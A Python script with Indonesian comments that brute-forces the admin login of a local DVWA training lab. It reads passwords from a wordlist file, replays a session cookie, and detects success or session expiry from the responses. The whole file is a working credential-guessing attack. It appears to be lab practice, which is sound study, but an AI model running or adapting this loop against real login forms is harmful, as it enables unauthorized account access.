import requests

# 1. Konfigurasi Target
target_url = "http://localhost/dvwa/vulnerabilities/brute/"
username = "admin"
filename = "password_list.txt" 

# 2. Cookie Session (Pastikan PHPSESSID masih aktif di browser)
user_cookies = {
    "PHPSESSID": "jo8dbv84erinvsemfp17kv4h73", 
    "security": "medium"
}

print(f"--- Memulai Brute Force (Target: {username}) ---")

try:
    with open(filename, "r") as file:
        for line in file:
            password = line.strip()
            
            params = {
                'username': username,
                'password': password,
                'Login': 'Login'
            }
            
            # 5. Mengirim Request
            # Kita gunakan allow_redirects=False untuk mendeteksi jika kita dilempar ke login.php
            response = requests.get(target_url, params=params, cookies=user_cookies, allow_redirects=False)
            
            # --- PERBAIKAN LOGIKA 1: Cek Validitas Session ---
            # Jika respon memberikan status 302 (Redirect) ke login.php, berarti session mati
            if response.status_code == 302:
                print("[ERROR] Session Expired! Silakan login ulang di browser dan update PHPSESSID.")
                exit()

            # --- PERBAIKAN LOGIKA 2: Positive Matching ---
            # Kita mencari kata spesifik yang HANYA muncul jika login BERHASIL
            # Di DVWA, indikatornya adalah tulisan "Welcome"
            if "Welcome" in response.text:
                print(f"[SUCCESS] Password ditemukan: {password}")
                break
            else:
                # Jika masih ada kata "incorrect", berarti session hidup tapi password salah
                if "incorrect" in response.text:
                    print(f"[FAILED] Mencoba: {password}")
                else:
                    # Antisipasi jika ada error lain (misal halaman tidak ditemukan)
                    print(f"[!] Respon tidak dikenal pada password: {password}")

except FileNotFoundError:
    print(f"Error: File {filename} tidak ditemukan!")
except Exception as e:
    print(f"Terjadi error: {e}")

print("\nProses Selesai.")